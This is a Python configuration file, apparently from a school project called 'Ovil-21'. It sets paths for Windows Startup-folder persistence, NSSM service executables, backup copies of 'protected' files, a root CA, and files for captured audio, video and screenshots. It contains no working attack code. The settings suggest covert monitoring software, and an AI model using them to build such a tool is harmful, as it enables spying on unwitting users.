PROJECT_NAME = "Ovil-21"
OVIL_PATH = "ovil-21.exe"
ALT_OVIL_PATH = r"C:\Users\ofek\output\alt\ovil-21.exe"
FFMPEG_PATH = r"D:\python-school\Ovil-21_3\ffmpeg.exe"
FFMPEG_PATH_ALT = r"C:\Users\ofek\output\alt\ffmpeg.exe"
ROOT_DIRECTORY = r"C:\Users\ofek\output"
ALTERNATE_ROOT_DIRECTORY = rf"{ROOT_DIRECTORY}\alt"
CERT_FOLDER = r"..\folder" # TODO: change this
ROOT_CA_NAME = "root_ca"
import os
# DEFAULT_COMPUTER_NAME = "___Computer_name___"
DEFAULT_USER_NAME = os.getlogin()
START_UP_FOLDER = rf"C:\Users\{DEFAULT_USER_NAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
ALT_START_UP_FOLDER = r"C:\Users\ofek\output\alt"
# TODO: replace computer name
SERVICE_NAME = "service"
SERVICE_PATH = r"C:\Users\ofek\output"
NSSM_PATH = r"C:\Users\ofek\output\nssm.exe"
ALTERNATE_NSSM_PATH = r"C:\Users\ofek\output\alt\nssm.exe"
ALTERNATE_SERVICE_PATH = r"C:\Users\ofek\output\alt"
SERVICE_PATHS = [(f"{SERVICE_PATH}\\{SERVICE_NAME}1.exe", f"{ALTERNATE_SERVICE_PATH}\\{SERVICE_NAME}1.exe"), (f"{SERVICE_PATH}\\{SERVICE_NAME}2.exe", f"{ALTERNATE_SERVICE_PATH}\\{SERVICE_NAME}2.exe"), (NSSM_PATH, ALTERNATE_NSSM_PATH)]
PROTECTED_FILES = SERVICE_PATHS + [(FFMPEG_PATH, FFMPEG_PATH_ALT), (OVIL_PATH, ALT_OVIL_PATH), (f"{START_UP_FOLDER}\\{PROJECT_NAME}.lnk", f"{ALT_START_UP_FOLDER}\\{PROJECT_NAME}.lnk")]
#TODO: add here the ovil exe file
PROTECTED_DIRS = [(ROOT_DIRECTORY, ALTERNATE_ROOT_DIRECTORY)]
DEFAULT_AUDIO_NAME = "temp_audio.wav"
DEFAULT_VIDEO_NAME = "temp_video.avi"
DEFAULT_VIDEO_AUDIO_NAME = "video_audio.mkv"
DEFAULT_SCREENSHOT_NAME = "screenshot.jpg"

# TODO: make nssm path and service path not the same